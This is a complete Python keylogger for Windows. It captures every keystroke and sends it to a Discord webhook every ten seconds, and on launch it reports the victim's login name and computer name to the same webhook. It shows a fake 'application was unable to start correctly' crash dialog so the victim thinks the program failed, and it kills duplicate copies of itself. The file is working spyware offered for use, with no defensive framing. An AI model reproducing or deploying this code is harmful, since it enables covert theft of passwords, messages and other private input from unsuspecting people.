import requests
import time
import threading
import ctypes
import psutil
from pynput.keyboard import Listener
import os
import sys

# --- CONFIGURATION ---
# Replace with your actual Discord webhook URL.
# IMPORTANT: Keep this URL secure. Anyone with this URL can post to your channel.
WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"

# Time in seconds to wait before sending the key buffer
SEND_INTERVAL = 10 

# --- GLOBALS ---
# Use a simple string buffer for better readability
key_buffer = ""
# A lock to make our key_buffer thread-safe
buffer_lock = threading.Lock()

# --- FUNCTIONS ---

def get_script_name():
    """Gets the name of the current script or executable."""
    # When running as a PyInstaller executable, sys.executable is the path to the .exe
    return os.path.basename(sys.executable)

def kill_existing_process():
    """Finds and kills other running instances of this script/executable."""
    current_pid = os.getpid()
    script_name = get_script_name()

    for proc in psutil.process_iter(['pid', 'name']):
        # Check if the process name matches and it's not the current process
        if proc.info['name'] == script_name and proc.pid != current_pid:
            try:
                print(f"Found existing process: PID {proc.pid}. Terminating.")
                # Optional: Notify that a duplicate was found and killed
                # send_webhook(f"INFO: A duplicate instance of '{script_name}' was found and terminated.")
                proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                print(f"Failed to kill process {proc.pid}: {e}")
                continue

def send_webhook(content: str):
    """Sends a message to the configured Discord webhook."""
    if not content:
        return # Don't send empty messages

    data = {"content": content}

    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=5)
        # Raise an exception for bad status codes (4xx or 5xx)
        response.raise_for_status() 
    except requests.exceptions.RequestException as e:
        # Log errors instead of silently passing. This is crucial for debugging.
        # In a real scenario, you might write this to a local log file.
        print(f"Error sending webhook: {e}")

def on_press(key):
    """Callback function for when a key is pressed."""
    global key_buffer
    
    # Format the key press into a readable string
    try:
        # For normal alphanumeric keys
        key_str = key.char
    except AttributeError:
        # For special keys (e.g., Key.space, Key.enter)
        key_str = f" [{str(key).replace('Key.', '')}] "

    # Append to the buffer in a thread-safe way
    with buffer_lock:
        key_buffer += key_str

def fake_error_message():
    """Displays a fake error message to the user to make them think the app crashed."""
    # This message box will block until the user clicks OK.
    ctypes.windll.user32.MessageBoxW(
        0, 
        "The application was unable to start correctly (0xc000007b).\nClick OK to close the application.", 
        "Application Error", 
        0x10 # 0x10 is MB_ICONHAND for a critical error icon
    )

def main():
    """Main function to set up and run the keylogger."""
    # 1. Ensure only one instance is running
    kill_existing_process()

    # 2. Start the keyboard listener in a separate thread
    # The listener thread will run in the background and call on_press for each keystroke
    listener = Listener(on_press=on_press)
    listener.start()

    # 3. Show the fake error message to deceive the user
    # We run this in a daemon thread so it doesn't prevent the main script from exiting
    # if the user never clicks the "OK" button.
    error_thread = threading.Thread(target=fake_error_message, daemon=True)
    error_thread.start()

    # 4. Notify that the logger is active
    send_webhook(f"✅ **New Connection Established!**\n> Monitoring `{os.getlogin()}` on `{os.environ.get('COMPUTERNAME', 'Unknown PC')}`")

    # 5. Main loop to periodically send the captured keys
    global key_buffer
    while True:
        time.sleep(SEND_INTERVAL)
        
        # In a thread-safe block, copy the buffer and then clear it
        with buffer_lock:
            if not key_buffer:
                # Optional: Send a heartbeat to know it's still alive
                # send_webhook("Heartbeat: No activity.")
                continue

            # Copy the buffer to a local variable to send
            data_to_send = key_buffer
            # Clear the global buffer
            key_buffer = ""

        # Send the copied data
        send_webhook(f"```{data_to_send}```")


if __name__ == "__main__":
    main()
